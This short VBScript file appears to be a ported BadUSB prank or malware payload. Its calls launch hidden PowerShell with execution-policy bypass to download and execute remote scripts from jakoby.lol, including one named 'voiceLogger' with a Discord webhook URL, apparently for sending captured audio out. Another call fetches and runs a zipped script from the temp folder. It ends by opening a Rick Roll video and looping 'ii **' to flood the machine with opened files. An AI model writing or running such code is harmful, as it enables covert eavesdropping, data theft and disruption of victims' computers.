' Delay for 1 second
WScript.Sleep 1000

' Open Run dialog
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1175602749753274368/5HNYflzxKAvdedCG6oD-XKoBlr7W_o9RyDLvKndyFkpMjvgLcEaL6-qAF8Ar4dt2zjVI';irm jakoby.lol/voiceLogger | iex", 1, True

' Press ENTER
WshShell.SendKeys "{ENTER}"

' Delay for 0.5 seconds
WScript.Sleep 500

' Open Run dialog
WshShell.Run "powershell -w h -NoP -NonI -Ep Bypass $D='$env:tmp';irm -Uri 'https://jakoby.lol/kiv' -O '$D\js.zip';Expand-Archive '$D\js.zip' -Des $D -Force;. '$D\js\js.ps1'", 1, True

' Press ENTER
WshShell.SendKeys "{ENTER}"

' Delay for 0.5 seconds
WScript.Sleep 500

' Open Run dialog
WshShell.Run "powershell -w h -NoP -NonI -Ep Bypass irm https://jakoby.lol/zyg | iex", 1, True

' Press ENTER
WshShell.SendKeys "{ENTER}"

' Delay for 0.5 seconds
WScript.Sleep 500

' Open Run dialog
WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 1, True

' Press ENTER
WshShell.SendKeys "{ENTER}"

' Delay for 1 second
WScript.Sleep 1000

' Open Run dialog
WshShell.Run "powershell while(1){ii **}", 1, True

' Press ENTER
WshShell.SendKeys "{ENTER}"

' Repeat the last two blocks with different delays

' ...

' Open Run dialog
WshShell.Run "powershell while(1){ii **}", 1, True

' Delay for 0.5 seconds
WScript.Sleep 500

' Press GUI d
WshShell.SendKeys "^{d}"
